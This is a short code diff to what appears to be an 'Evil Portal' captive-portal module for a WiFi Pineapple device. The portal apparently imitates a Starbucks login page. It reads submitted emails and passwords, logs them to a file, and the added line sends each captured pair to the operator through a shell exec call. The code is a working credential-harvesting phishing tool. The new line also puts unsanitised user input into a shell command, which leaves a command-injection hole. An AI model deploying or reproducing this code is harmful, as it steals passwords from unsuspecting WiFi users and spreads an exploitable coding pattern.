@@ -16,6 +16,7 @@ class MyPortal extends Portal
             $email = isset($_POST['email']) ? $_POST['email'] : 'email';
             $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
             file_put_contents("/sd/evilportal-logs/sbux-login.txt", date('Y-m-d H:i:s') .  " {$email} - {$pwd}\n", FILE_APPEND);
+            exec("pineapple notify $email'-'$pwd");
         }
         // handle form input or other extra things there
 
